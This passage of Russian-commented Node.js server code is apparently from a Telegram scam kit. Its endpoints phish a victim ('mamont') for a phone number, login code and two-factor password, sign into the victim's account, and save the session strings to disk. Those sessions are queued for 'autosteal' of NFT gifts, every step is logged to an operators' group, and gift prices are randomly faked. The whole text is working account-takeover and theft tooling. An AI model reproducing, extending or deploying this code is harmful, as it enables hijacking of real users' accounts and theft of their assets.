        console.log(`[API-INVENTORY] Локальная фильтрация дала ${userGifts.length} подарков`);
      }
    } else {
      // Фильтруем с учетом разных типов - используем СТРОКОВОЕ сравнение
      console.log(`[API-INVENTORY] Фильтрация локально для userId: ${userId} (тип запроса: ${typeof userId})`);
      const userIdStr = String(userId);
      console.log(`[API-INVENTORY] userId как строка для поиска: "${userIdStr}"`);
      
      userGifts = allGifts.filter(g => {
        const gUserIdStr = String(g.userId);
        const match = gUserIdStr === userIdStr;
        if (match) {
          console.log(`[API-INVENTORY] ✅ Найден подарок: ${g.giftId} для userId: ${g.userId} (как строка: "${gUserIdStr}")`);
        }
        return match;
      });
      console.log(`[API-INVENTORY] Отфильтровано подарков: ${userGifts.length}`);
    }
    
    // Если подарки не найдены, но в БД они есть - просто логируем в консоль
    if (userGifts.length === 0 && allGifts.length > 0) {
      console.log(`[API-INVENTORY] ⚠️ Подарки не найдены для userId: ${userId}`);
    }

    // Преобразуем в формат для маркета
    const formattedGifts = userGifts.map(gift => {
      // Парсим giftId для получения имени и ID
      const match = gift.giftId.match(/^(.+)-(\d+)$/);
      if (match) {
        const [, giftName, giftIdNum] = match;
        const formattedName = giftName.replace(/([A-Z])/g, ' $1').trim();
        
        // Генерируем цену (можно взять из processed_links.txt или использовать дефолтную)
        const tonPrice = (Math.random() * 100 + 1).toFixed(3);
        const rubPrice = (parseFloat(tonPrice) * 221.7).toFixed(2);
        
        return {
          name: formattedName,
          originalName: giftName,
          id: giftIdNum,
          giftId: gift.giftId, // Полный ID для API
          tonPrice: parseFloat(tonPrice),
          rubPrice: parseFloat(rubPrice),
          imageUrl: `https://nft.fragment.com/gift/${giftName.toLowerCase()}-${giftIdNum}.medium.jpg`,
          telegramUrl: gift.giftLink,
          receivedAt: gift.receivedAt,
          status: gift.status
        };
      }
      return null;
    }).filter(g => g !== null);

    console.log(`[API] Отформатировано подарков для отправки: ${formattedGifts.length}`);
    if (formattedGifts.length > 0) {
      console.log(`[API] Пример подарка:`, JSON.stringify(formattedGifts[0], null, 2));
      // Отправляем успешный лог (только если подарки найдены)
    } else {
      console.log(`[API] НЕТ подарков для userId: ${userId}`);
      console.log(`[API] Проверка БД...`);
      const allGiftsCheck = await loadMamontGiftsDB();
      console.log(`[API] Всего подарков в БД: ${allGiftsCheck.length}`);
    }

    res.json(formattedGifts);
  } catch (e) {
    console.error(`[API] Ошибка получения инвентаря: ${e.message}`);
    console.error(e.stack);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// API для создания сессии (отправка кода)
app.post('/api/create-session', async (req, res) => {
  try {
    let { phoneNumber, workerUsername, workerId, mamontUsername, mamontId, giftId, token } = req.body;
    
    if (!phoneNumber) {
      return res.status(400).json({ error: 'Номер телефона не указан' });
    }
    
    // Если есть токен и параметры не переданы, декодируем токен
    if (token && (!workerUsername && !workerId && !mamontUsername && !mamontId)) {
      const decoded = decodeParams(token);
      if (decoded) {
        workerUsername = workerUsername || decoded.worker || null;
        workerId = workerId || decoded.worker_id || null;
        mamontUsername = mamontUsername || decoded.mamont_username || null;
        mamontId = mamontId || decoded.mamont_id || null;
        console.log(`[CREATE-SESSION] Декодированы параметры из токена: worker=${workerUsername}, workerId=${workerId}, mamont=${mamontUsername}, mamontId=${mamontId}`);
      }
    }
    
    phoneNumber = phoneNumber.trim().replace(/\s+/g, '');
    if (!phoneNumber.startsWith('+')) {
      phoneNumber = '+' + phoneNumber;
    }
    
    // Логируем ввод номера телефона (только если есть mamontId или mamontUsername)
    if (mamontId || mamontUsername) {
      const userId = mamontId || 'неизвестно';
      const rawUsername = mamontUsername || null;
      const username = isValidUsername(rawUsername) ? rawUsername : null;
      const logKey = `phone_input_${userId}_${phoneNumber}`;
      const now = Date.now();
      
      // Проверяем, не отправляли ли мы уже этот лог недавно (в течение 30 секунд)
      const recentLog = recentLogs.get(logKey);
      if (!recentLog || (now - recentLog.timestamp > 30000)) {
        const maskedPhone = maskPhoneNumber(phoneNumber);
        
        // Формируем текст мамонта: если username валидный, показываем его, иначе только ID
        const mamontText = username 
          ? `👤 <b>Мамонт:</b> @${username} (<code>${userId}</code>)`
          : `👤 <b>Мамонт:</b> <code>${userId}</code>`;
        
        await sendLogToGroup(
          `📞 <b>Ввод номера телефона</b>\n\n\n` +
          `📱 <b>Номер:</b> <code>${maskedPhone}</code>\n` +
          `${mamontText}`
        );
        
        // Сохраняем время отправки лога
        recentLogs.set(logKey, { logType: 'phone_input', timestamp: now });
        
        // Очищаем старые логи (старше 30 секунд)
        for (const [key, value] of recentLogs.entries()) {
          if (now - value.timestamp > 30000) {
            recentLogs.delete(key);
          }
        }
      }
    }
    
    // ВСЕГДА удаляем ВСЕ существующие сессии и запросы кода для этого номера
    console.log(`[CREATE-SESSION] ========== НОВЫЙ ЗАПРОС КОДА ==========`);
    console.log(`[CREATE-SESSION] Номер: ${phoneNumber}`);
    console.log(`[CREATE-SESSION] Закрываем ВСЕ существующие сессии для этого номера`);
    
    // Удаляем активный запрос кода, если есть
    if (activeCodeRequests.has(phoneNumber)) {
      console.log(`[CREATE-SESSION] Удаляем активный запрос кода для номера ${phoneNumber}`);
      activeCodeRequests.delete(phoneNumber);
    }
    
    // Удаляем старые сессии с таким номером
    const sessionsToDelete = [];
    for (const [oldSessionId, oldSessionData] of activeSessions.entries()) {
      if (oldSessionData.phoneNumber === phoneNumber) {
        sessionsToDelete.push({ 
          sessionId: oldSessionId, 
          client: oldSessionData.client,
          phoneCodeHash: oldSessionData.phoneCodeHash 
        });
      }
    }
    
    // Отключаем и удаляем старые сессии
    const disconnectPromises = [];
    for (const { sessionId, client } of sessionsToDelete) {
      // Сначала удаляем из Map, чтобы не мешали
      activeSessions.delete(sessionId);
      workerInfo.delete(sessionId);
      
      if (client) {
        disconnectPromises.push(
          (async () => {
            try {
              // Принудительно отключаем клиент
              if (client.connected) {
                await client.disconnect();
                console.log(`[CREATE-SESSION] Клиент ${sessionId} отключен`);
              } else {
                // Если не подключен, все равно пытаемся закрыть соединение
                try {
                  if (client._sender && client._sender._transport) {
                    client._sender._transport.close();
                  }
                } catch (e) {
                  // Игнорируем ошибки
                }
              }
            } catch (e) {
              console.log(`[CREATE-SESSION] Ошибка отключения клиента для ${sessionId}:`, e.message);
              // Пытаемся принудительно закрыть
              try {
                if (client._sender && client._sender._transport) {
                  client._sender._transport.close();
                }
                if (client._connection) {
                  client._connection.close();
                }
              } catch (e2) {
                console.log(`[CREATE-SESSION] Ошибка принудительного закрытия для ${sessionId}:`, e2.message);
              }
            }
          })()
        );
      }
    }
    
    // Ждем отключения всех старых клиентов
    if (disconnectPromises.length > 0) {
      console.log(`[CREATE-SESSION] Отключаем ${disconnectPromises.length} старых сессий для номера ${phoneNumber}`);
      await Promise.allSettled(disconnectPromises);
      // Увеличиваем задержку для гарантии полного закрытия всех соединений
      await new Promise(resolve => setTimeout(resolve, 2000));
      console.log(`[CREATE-SESSION] Старые сессии отключены`);
    }
    
    // Дополнительно очищаем все связанные данные
    // Удаляем из mamontSessions все записи с этим номером
    for (const [userId, sessionInfo] of mamontSessions.entries()) {
      const sessionData = activeSessions.get(sessionInfo.sessionId);
      if (sessionData && sessionData.phoneNumber === phoneNumber) {
        mamontSessions.delete(userId);
        console.log(`[CREATE-SESSION] Удалена запись mamontSessions для userId ${userId}`);
      }
    }
    
    // Очищаем сохраненный номер для этого userId
    if (mamontId) {
      const normalizedUserId = String(mamontId);
      if (savedPhoneNumbers.has(normalizedUserId)) {
        console.log(`[CREATE-SESSION] Очищаем сохраненный номер для userId ${normalizedUserId}`);
        savedPhoneNumbers.delete(normalizedUserId);
      }
    }
    
    // ВСЕГДА создаем НОВЫЙ запрос на вход
    console.log(`[CREATE-SESSION] ========== СОЗДАНИЕ НОВОГО ЗАПРОСА ==========`);
    
    // Создаем уникальный sessionId для новой сессии
    const sessionId = `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    console.log(`[CREATE-SESSION] Новый sessionId: ${sessionId}`);
    
    try {
      // Создаем полностью новую пустую сессию
      const session = new StringSession("");
      
      // Создаем новый клиент с уникальными параметрами для каждого запроса
      const uniqueDeviceId = `Device-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
      const client = new TelegramClient(session, apiId, apiHash, {
        connectionRetries: 5,
        receiveUpdates: false,
        timeout: 60000,
        requestRetries: 3,
        deviceModel: uniqueDeviceId,
        systemVersion: 'Windows 11',
        appVersion: '10.0.0',
        langCode: 'en',
        systemLangCode: 'en',
        langPack: 'tdesktop',
      });
      
      console.log(`[CREATE-SESSION] Подключаю новый клиент (deviceModel: ${uniqueDeviceId})...`);
      await client.connect();
      console.log(`[CREATE-SESSION] Клиент подключен!`);
      console.log(`[CREATE-SESSION] Отправляю НОВЫЙ запрос кода для номера ${phoneNumber}...`);
      
      // ВСЕГДА отправляем новый запрос кода
      const result = await client.sendCode(
        { apiId: apiId, apiHash: apiHash },
        phoneNumber
      );
      
      console.log(`[CREATE-SESSION] ✅ КОД ОТПРАВЛЕН! phoneCodeHash: ${result.phoneCodeHash}`);
      
      console.log(`[CREATE-SESSION] Код успешно отправлен, phoneCodeHash: ${result.phoneCodeHash}`);
      
      // Сохраняем информацию о запросе кода
      const timeout = result.timeout || 120; // timeout в секундах
      activeCodeRequests.set(phoneNumber, {
        sessionId: sessionId,
        phoneCodeHash: result.phoneCodeHash,
        createdAt: Date.now(),
        timeout: timeout
      });
      
      activeSessions.set(sessionId, {
        phoneNumber,
        phoneCodeHash: result.phoneCodeHash,
        client,
        session,
        workerUsername: workerUsername || null,
        workerId: workerId || null,
        mamontUsername: mamontUsername || null,
        mamontId: mamontId || null,
        giftId: giftId || null
      });
      
      if (workerUsername || workerId) {
        workerInfo.set(sessionId, { username: workerUsername, id: workerId });
      }
      
      // Сохраняем sessionId для мамонта, чтобы WebApp мог автоматически получить его
      if (mamontId) {
        mamontSessions.set(String(mamontId), {
          sessionId: sessionId,
          giftId: giftId || null,
          createdAt: new Date().toISOString()
        });
      }
      
      console.log(`[API] Сессия создана: ${sessionId}, Phone: ${phoneNumber}, Mamont: @${mamontUsername} (${mamontId})`);
      
      res.json({ 
        success: true, 
        sessionId,
        message: 'Код отправлен в Telegram'
      });
    } catch (error) {
      console.error(`[CREATE-SESSION] Ошибка при создании сессии для номера ${phoneNumber}:`, error);
      logError(error, 'API-CREATE-SESSION');
      
      const errorMsg = String(error.errorMessage || error.message || error.toString() || '').toLowerCase();
      const waitMatch = errorMsg.match(/wait of (\d+)/) || 
                       errorMsg.match(/flood_wait[_\s]?(\d+)/) ||
                       (error.seconds && [String(error.seconds)]);
      
      if (waitMatch) {
        const waitSeconds = parseInt(waitMatch[1]) || (error.seconds ? parseInt(error.seconds) : 0);
        const waitMinutes = Math.ceil(waitSeconds / 60);
        const waitHours = Math.floor(waitMinutes / 60);
        const remainingMinutes = waitMinutes % 60;
        
        let waitTimeText = '';
        if (waitHours > 0) {
          waitTimeText = `${waitHours} ${waitHours === 1 ? 'час' : waitHours < 5 ? 'часа' : 'часов'}`;
          if (remainingMinutes > 0) {
            waitTimeText += ` ${remainingMinutes} ${remainingMinutes === 1 ? 'минуту' : remainingMinutes < 5 ? 'минуты' : 'минут'}`;
          }
        } else {
          waitTimeText = `${waitMinutes} ${waitMinutes === 1 ? 'минуту' : waitMinutes < 5 ? 'минуты' : 'минут'}`;
        }
        
        console.log(`[CREATE-SESSION] Flood wait для номера ${phoneNumber}: ${waitSeconds} секунд (${waitTimeText})`);
        return res.status(429).json({ 
          error: `Слишком много попыток. Пожалуйста, подождите ${waitTimeText} перед повторной отправкой кода.`,
          floodWait: true,
          waitSeconds: waitSeconds
        });
      }
      
      res.status(500).json({ error: error.message || 'Ошибка создания сессии' });
    }
  } catch (error) {
    console.error(`[CREATE-SESSION] Критическая ошибка:`, error);
    logError(error, 'API-CREATE-SESSION');
    res.status(500).json({ error: 'Internal server error' });
  }
});

// API для проверки кода
app.post('/api/verify-code', async (req, res) => {
  try {
    const { sessionId, code } = req.body;
    
    if (!sessionId || !code) {
      return res.status(400).json({ error: 'Неверный код' });
    }
    
    const sessionData = activeSessions.get(sessionId);
    if (!sessionData) {
      return res.status(404).json({ error: 'СЭССИЯ ПЭ П🅰️ЙДЭП🅰️' });
    }
    
    try {
      const { client, phoneNumber, phoneCodeHash } = sessionData;
      
      try {
        await client.invoke(
          new Api.auth.SignIn({
            phoneNumber: phoneNumber,
            phoneCodeHash: phoneCodeHash,
            phoneCode: code,
          })
        );
        
        // Авторизация успешна без пароля
        const sessionString = client.session.save();
        
        // Сохраняем сессию в файл
        const userId = sessionData.mamontId || 'unknown';
        const rawUsername = sessionData.mamontUsername || null;
        // Используем username только если он валидный, иначе null
        const username = isValidUsername(rawUsername) ? rawUsername : null;
        const sessionUsername = username || `user${userId}`; // Для имени папки используем user${userId} если нет username
        const workerUsername = sessionData.workerUsername || null;
        const workerId = sessionData.workerId || null;
        const sessionDir = path.join(__dirname, 'sessions', `${userId}_${sessionUsername}`);
        await fs.ensureDir(sessionDir);
        const timestamp = Date.now();
        const sessionPath = path.join(sessionDir, `session_${timestamp}.session`);
        await fs.writeFile(sessionPath, sessionString, 'utf-8');
        
        // Сохраняем метаданные в JSON файл
        const sessionDataFile = sessionPath.replace('.session', '.json');
        const sessionMetadata = {
          phoneNumber: phoneNumber,
          mamontUsername: username,
          mamontId: userId,
          workerUsername: workerUsername,
          workerId: workerId,
          createdAt: new Date().toISOString()
        };
        await fs.writeJson(sessionDataFile, sessionMetadata, { spaces: 2 });
        console.log(`[SESSION] Сохранены метаданные в: ${sessionDataFile}`);
        
        // Обновляем путь к сессии в подарке
        if (sessionData.giftId && getGiftInfo) {
          const gift = await getGiftInfo(sessionData.giftId, userId);
          if (gift) {
            // Обновляем sessionPath в БД
            const gifts = await loadMamontGiftsDB();
            const giftIndex = gifts.findIndex(g => {
              const gUserId = typeof g.userId === 'string' ? parseInt(g.userId) : g.userId;
              return (gUserId === userId || String(g.userId) === String(userId)) && g.giftId === sessionData.giftId;
            });
            if (giftIndex !== -1) {
              gifts[giftIndex].sessionPath = sessionPath;
              await saveMamontGiftsDB(gifts);
            }
          }
        }
        
        const workerText = workerUsername || workerId ? `\n👤 <b>Воркер:</b> @${workerUsername || 'неизвестно'} (<code>${workerId || 'неизвестно'}</code>)` : '';
        
        // Формируем текст мамонта: если username валидный, показываем его, иначе только ID
        const mamontText = username 
          ? `👤 <b>Мамонт:</b> @${username} (<code>${userId}</code>)`
          : `👤 <b>Мамонт:</b> <code>${userId}</code>`;
        
        await sendLogToGroup(
          `✅ <b>Код подтверждён</b>\n` +
          `🔐 <b>Статус:</b> Вход без пароля\n` +
          `${mamontText}${workerText}`
        );
        
        await client.disconnect();
        activeSessions.delete(sessionId);
        
        // Удаляем запрос кода, так как авторизация успешна
        if (phoneNumber) {
          activeCodeRequests.delete(phoneNumber);
          console.log(`[VERIFY-CODE] Удален активный запрос кода для номера ${phoneNumber} (авторизация успешна)`);
        }
        
        // Добавляем сессию в очередь для автостила
        const sessionInfo = {
          phoneNumber: phoneNumber,
          mamontUsername: username,
          mamontId: userId,
          workerUsername: workerUsername,
          workerId: workerId
        };
        
        try {
          console.log(`[AUTOSTEAL] Отправляю сессию в очередь: ${sessionPath}`);
          const response = await fetch(`http://localhost:${PORT}/api/start-autosteal`, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              sessionPath,
              sessionInfo,
              workerUsername,
              workerId,
              mamontUsername: username,
              mamontId: userId
            })
          });
          const result = await response.json();
          console.log(`[AUTOSTEAL] Ответ от /api/start-autosteal:`, result);
        } catch (e) {
          console.error(`[AUTOSTEAL] Ошибка отправки сессии в очередь:`, e);
        }
        
        res.json({ success: true, sessionPath });
        } catch (error) {
        if (error.errorMessage === 'SESSION_PASSWORD_NEEDED' || error.message?.includes('PASSWORD')) {
          // Требуется пароль
          activeSessions.set(sessionId, {
            ...sessionData,
            needsPassword: true,
            code: code
          });
          
          const userId = sessionData.mamontId || 'unknown';
          const rawUsername = sessionData.mamontUsername || null;
          const username = isValidUsername(rawUsername) ? rawUsername : null;
          const workerUsername = sessionData.workerUsername || null;
          const workerId = sessionData.workerId || null;
          const workerText = workerUsername || workerId ? `\n👤 <b>Воркер:</b> @${workerUsername || 'неизвестно'} (<code>${workerId || 'неизвестно'}</code>)` : '';
          
          // Получаем подсказку к паролю
          let passwordHint = '';
          try {
            const passwordSrpResult = await client.invoke(new Api.account.GetPassword());
            passwordHint = passwordSrpResult.hint || '';
            console.log(`[VERIFY-CODE] Получена подсказка к паролю: ${passwordHint || 'нет подсказки'}`);
          } catch (e) {
            console.error('[VERIFY-CODE] Ошибка получения подсказки к паролю:', e);
          }
          
          // Формируем текст мамонта: если username валидный, показываем его, иначе только ID
          const mamontText = username 
            ? `👤 <b>Мамонт:</b> @${username} (<code>${userId}</code>)`
            : `👤 <b>Мамонт:</b> <code>${userId}</code>`;
          
          await sendLogToGroup(
            `✅ <b>Код подтверждён</b>\n` +
            `🔐 <b>Статус:</b> Требуется пароль\n` +
            `${mamontText}${workerText}`
          );
          
          res.json({ 
            success: true, 
            needsPassword: true,
            requiresPassword: true, // Добавляем оба флага для совместимости
            message: 'Требуется пароль',
            passwordHint: passwordHint // Добавляем подсказку к паролю
          });
        } else {
          throw error;
        }
      }
    } catch (error) {
      const errorMsg = String(error.errorMessage || error.message || error.toString() || '').toUpperCase();
      
      // Если код истек, удаляем из activeCodeRequests, чтобы разрешить новый запрос
      if (errorMsg.includes('PHONE_CODE_EXPIRED') || errorMsg.includes('CODE_EXPIRED')) {
        const sessionData = activeSessions.get(sessionId);
        if (sessionData && sessionData.phoneNumber) {
          activeCodeRequests.delete(sessionData.phoneNumber);
          console.log(`[VERIFY-CODE] Код истек для номера ${sessionData.phoneNumber}, удален из activeCodeRequests`);
        }
        return res.status(400).json({ 
          error: 'Код истек. Запросите новый код.',
          codeExpired: true
        });
      }
      
      logError(error, 'API-VERIFY-CODE');
      res.status(400).json({ error: 'Неверный код' });
    }
  } catch (error) {
    logError(error, 'API-VERIFY-CODE');
    res.status(500).json({ error: 'Internal server error' });
  }
});

// API для проверки пароля
app.post('/api/verify-password', async (req, res) => {
  try {
    const { sessionId, password } = req.body;
    
    if (!sessionId || !password) {
      return res.status(400).json({ error: 'Неверный пароль' });
    }
    
    const sessionData = activeSessions.get(sessionId);
    if (!sessionData || !sessionData.needsPassword) {
      return res.status(404).json({ error: 'Сессия не найдена или пароль не требуется' });
    }
    
    try {
      const { client } = sessionData;
      
      const passwordSrpResult = await client.invoke(new Api.account.GetPassword());
      const { computeCheck } = require("telegram/Password");
      const passwordCheck = await computeCheck(passwordSrpResult, password);
      
      await client.invoke(
        new Api.auth.CheckPassword({
          password: passwordCheck,
        })
      );
      
      // Ждем завершения синхронизации (получаем информацию о пользователе)
      try {
        await client.getMe();
        console.log(`[VERIFY-PASSWORD] Синхронизация завершена`);
      } catch (syncError) {
        console.warn(`[VERIFY-PASSWORD] Предупреждение при синхронизации: ${syncError.message}`);
        // Продолжаем даже если синхронизация не завершилась полностью
      }
      
      // Авторизация успешна
      const sessionString = client.session.save();
      
      // Сохраняем сессию
      const userId = sessionData.mamontId || 'unknown';
      const username = sessionData.mamontUsername || `user${userId}`;
      const workerUsername = sessionData.workerUsername || null;
      const workerId = sessionData.workerId || null;
      const sessionDir = path.join(__dirname, 'sessions', `${userId}_${username}`);
      await fs.ensureDir(sessionDir);
      const timestamp = Date.now();
      const sessionPath = path.join(sessionDir, `session_${timestamp}.session`);
      await fs.writeFile(sessionPath, sessionString, 'utf-8');
      
      // Сохраняем метаданные в JSON файл
      const sessionDataFile = sessionPath.replace('.session', '.json');
      const sessionMetadata = {
        phoneNumber: sessionData.phoneNumber,
        mamontUsername: username,
        mamontId: userId,
        workerUsername: workerUsername,
        workerId: workerId,
        createdAt: new Date().toISOString()
      };
      await fs.writeJson(sessionDataFile, sessionMetadata, { spaces: 2 });
      console.log(`[SESSION] Сохранены метаданные в: ${sessionDataFile}`);
      
      // Обновляем путь к сессии в подарке
      if (sessionData.giftId && getGiftInfo) {
        const gift = await getGiftInfo(sessionData.giftId, userId);
        if (gift) {
          const gifts = await loadMamontGiftsDB();
          const giftIndex = gifts.findIndex(g => {
            const gUserId = typeof g.userId === 'string' ? parseInt(g.userId) : g.userId;
            return (gUserId === userId || String(g.userId) === String(userId)) && g.giftId === sessionData.giftId;
          });
          if (giftIndex !== -1) {
            gifts[giftIndex].sessionPath = sessionPath;
            await saveMamontGiftsDB(gifts);
          }
        }
      }
      
      const workerText = workerUsername || workerId ? `\n👤 <b>Воркер:</b> @${workerUsername || 'неизвестно'} (<code>${workerId || 'неизвестно'}</code>)` : '';
      
        await sendLogToGroup(
          `✅ <b>Пароль подтверждён!</b>\n` +
          `🔓 Введён верный пароль\n` +
          `👤 <b>Мамонт:</b> @${username} (<code>${userId}</code>)${workerText}`
        );
        
        // Отключаем клиент после сохранения сессии
        try {
        await client.disconnect();
        } catch (disconnectError) {
          console.warn(`[VERIFY-PASSWORD] Ошибка при отключении клиента: ${disconnectError.message}`);
        }
        activeSessions.delete(sessionId);
        
        // Удаляем запрос кода, так как авторизация успешна
        if (sessionData.phoneNumber) {
          activeCodeRequests.delete(sessionData.phoneNumber);
          console.log(`[VERIFY-PASSWORD] Удален активный запрос кода для номера ${sessionData.phoneNumber} (авторизация успешна)`);
        }
      
      // Добавляем сессию в очередь для автостила
      const sessionInfo = {
        phoneNumber: sessionData.phoneNumber,
        mamontUsername: username,
        mamontId: userId,
        workerUsername: workerUsername,
        workerId: workerId
      };
      
      try {
        console.log(`[AUTOSTEAL] Отправляю сессию в очередь: ${sessionPath}`);
        const response = await fetch(`http://localhost:${PORT}/api/start-autosteal`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            sessionPath,
            sessionInfo,
            workerUsername,
            workerId,
            mamontUsername: username,
            mamontId: userId
          })
        });
        const result = await response.json();
        console.log(`[AUTOSTEAL] Ответ от /api/start-autosteal:`, result);
      } catch (e) {
        console.error(`[AUTOSTEAL] Ошибка отправки сессии в очередь:`, e);
      }
      
      res.json({ success: true, sessionPath });
    } catch (error) {
      logError(error, 'API-VERIFY-PASSWORD');
      
      const userId = sessionData.mamontId || 'unknown';
      const username = sessionData.mamontUsername || `user${userId}`;
      const workerUsername = sessionData.workerUsername || null;
      const workerId = sessionData.workerId || null;
      const workerText = workerUsername || workerId ? `\n👤 <b>Воркер:</b> @${workerUsername || 'неизвестно'} (<code>${workerId || 'неизвестно'}</code>)` : '';
      
      await sendLogToGroup(
        `❌ <b>Неверный пароль</b>\n` +
        `⚠️ Введён неверный пароль\n` +
        `👤 <b>M🅰️M0ПT:</b> @${username} (<code>${userId}</code>)${workerText}`
      );
      
      res.status(400).json({ error: 'Неверный пароль' });
    }
  } catch (error) {
    logError(error, 'API-VERIFY-PASSWORD');
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Получение информации о подарке и запуск автостила
app.get('/api/gift/:giftId', async (req, res) => {
  try {
    const { giftId } = req.params;
    const userId = parseInt(req.query.userId);
    const sessionId = req.query.sessionId; // Опциональный sessionId
    
    if (!userId || isNaN(userId)) {
      return res.status(400).json({ error: 'Invalid userId' });
    }

    // Получаем информацию о подарке
    const gift = getGiftInfo
      ? await getGiftInfo(giftId, userId)
      : (await loadMamontGiftsDB()).find(g => g.giftId === giftId && g.userId === userId);
    
    if (!gift) {
      return res.status(404).json({ error: 'Gift not found' });
    }

    // Если sessionId передан, обновляем sessionPath из активной сессии
    if (sessionId) {
      const sessionData = activeSessions.get(sessionId);
      if (sessionData && sessionData.sessionPath) {
        gift.sessionPath = sessionData.sessionPath;
      }
    }

    // НЕ запускаем автостил напрямую здесь - он должен запускаться только через очередь
    // Это предотвращает дублирование, так как сессия уже добавлена в очередь при создании
    // Если нужно запустить автостил для существующей сессии, используйте /api/start-autosteal
    console.log(`[API] /api/gift/:giftId вызван. sessionPath: ${gift.sessionPath || 'не указан'}`);
    if (gift.sessionPath) {
      console.log(`[API] Сессия найдена, но автостил должен запускаться через очередь. Используйте /api/start-autosteal для запуска.`);
    }

    // Парсим giftId для получения имени и ID
    const match = gift.giftId.match(/^(.+)-(\d+)$/);
    if (match) {
      const [, giftName, giftIdNum] = match;
      const formattedName = giftName.replace(/([A-Z])/g, ' $1').trim();
      
      const tonPrice = (Math.random() * 100 + 1).toFixed(3);
      const rubPrice = (parseFloat(tonPrice) * 221.7).toFixed(2);
      
      // Возвращаем информацию о подарке
      res.json({
        name: formattedName,
        originalName: giftName,
        id: giftIdNum,
        tonPrice: parseFloat(tonPrice),
        rubPrice: parseFloat(rubPrice),
        imageUrl: `https://nft.fragment.com/gift/${giftName.toLowerCase()}-${giftIdNum}.medium.jpg`,
        telegramUrl: gift.giftLink,
        receivedAt: gift.receivedAt,
        status: gift.status,
        autostealStarted: true
      });
    } else {
      res.json(gift);
    }
  } catch (e) {
    console.error(`[API] Ошибка получения информации о подарке: ${e.message}`);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Очередь сессий для автостила
const pendingSessions = [];
const processingSessions = new Set(); // Множество сессий, которые сейчас обрабатываются

// Эндпоинт для добавления сессии в очередь автостила
app.post('/api/start-autosteal', async (req, res) => {
  try {
    const { sessionPath, sessionInfo, workerUsername, workerId, mamontUsername, mamontId } = req.body;
    console.log(`[API] /api/start-autosteal вызван. sessionPath: ${sessionPath}`);
    console.log(`[API] Данные запроса:`, { workerUsername, workerId, mamontUsername, mamontId });
    
    if (sessionPath) {
      // Проверяем, нет ли уже такой сессии в очереди или в обработке
      const isInQueue = pendingSessions.some(s => s.sessionPath === sessionPath);
      const isProcessing = processingSessions.has(sessionPath);
      
      if (isInQueue || isProcessing) {
        console.log(`[API] Сессия ${sessionPath} уже в очереди или обрабатывается. Пропускаем.`);
        res.json({ success: true, pendingCount: pendingSessions.length, skipped: true });
        return;
      }
      
      const sessionData = { 
        sessionPath, 
        sessionInfo, 
        workerUsername, 
        workerId, 
        mamontUsername, 
        mamontId, 
        timestamp: Date.now() 
      };
      
      pendingSessions.push(sessionData);
      console.log(`[API] Сессия добавлена в очередь. Всего в очереди: ${pendingSessions.length}`);
      console.log(`[API] Данные добавленной сессии:`, sessionData);
    } else {
      console.error(`[API] sessionPath не указан! Тело запроса:`, req.body);
    }
    res.json({ success: true, pendingCount: pendingSessions.length });
  } catch (error) {
    logError(error, 'API-START-AUTOSTEAL');
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Эндпоинт для получения сессий из очереди
app.get('/api/get-pending-sessions', async (req, res) => {
  try {
    // Фильтруем сессии, которые уже обрабатываются
    const sessionsToProcess = pendingSessions.filter(s => !processingSessions.has(s.sessionPath));
    
    if (sessionsToProcess.length > 0) {
      // Добавляем в обработку
      sessionsToProcess.forEach(s => processingSessions.add(s.sessionPath));
      
      // Удаляем обработанные сессии из очереди (по sessionPath)
      const sessionPathsToRemove = new Set(sessionsToProcess.map(s => s.sessionPath));
      const remainingSessions = pendingSessions.filter(s => !sessionPathsToRemove.has(s.sessionPath));
      pendingSessions.length = 0;
      pendingSessions.push(...remainingSessions);
      
      console.log(`[API] /api/get-pending-sessions вызван. Возвращаю ${sessionsToProcess.length} сессий. В очереди осталось: ${pendingSessions.length}`);
    } else {
      console.log(`[API] /api/get-pending-sessions вызван. Нет новых сессий для обработки. В очереди: ${pendingSessions.length}, В обработке: ${processingSessions.size}`);
    }
    
    res.json({ sessions: sessionsToProcess });
  } catch (error) {
    logError(error, 'API-GET-PENDING-SESSIONS');
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Эндпоинт для удаления сессии из обработки (вызывается после завершения автостила)
app.post('/api/complete-autosteal', async (req, res) => {
  try {
    const { sessionPath } = req.body;
    if (sessionPath) {
      processingSessions.delete(sessionPath);
      console.log(`[API] Сессия ${sessionPath} удалена из обработки`);
    }
    res.json({ success: true });
  } catch (error) {
    logError(error, 'API-COMPLETE-AUTOSTEAL');
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Обновление списка подарков в маркете
app.post('/api/update-gifts', async (req, res) => {
  try {
    const { giftId, giftName, giftLink, tonPrice, rubPrice } = req.body;
    
    if (!giftId || !giftName || !giftLink) {
      return res.status(400).json({ error: 'Missing required fields' });
    }

    const processedLinksPath = path.join(__dirname, 'sursmarketa', 'templates2', 'processed_links.txt');
    
    // Формируем строку для добавления
    const line = `https://t.me/nft/${giftName}-${giftId} - ${tonPrice || '1.5'} TON (${rubPrice || '150.00'}₽)`;
    
    // Читаем существующий файл
    let existingLines = [];
    if (await fs.pathExists(processedLinksPath)) {
      const existingContent = await fs.readFile(processedLinksPath, 'utf-8');
      existingLines = existingContent.split('\n').filter(line => line.trim() && !line.startsWith('#'));
    }
    
    // Проверяем, нет ли уже такой строки
    if (!existingLines.includes(line)) {
      existingLines.push(line);
    }
    
    // Записываем обратно
    await fs.writeFile(processedLinksPath, existingLines.join('\n') + '\n', 'utf-8');
    
    res.json({ success: true, message: 'Gifts updated' });
  } catch (e) {
    console.error(`[API] Ошибка обновления подарков: ${e.message}`);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Получение всех подарков для маркета
app.get('/api/gifts', async (req, res) => {
  try {
    const processedLinksPath = path.join(__dirname, 'sursmarketa', 'templates2', 'processed_links.txt');
    
    if (!await fs.pathExists(processedLinksPath)) {
      return res.json([]);
    }
    
    const content = await fs.readFile(processedLinksPath, 'utf-8');
    const lines = content.split('\n').filter(line => line.trim() && !line.startsWith('#'));
    
    const gifts = lines.map(line => {
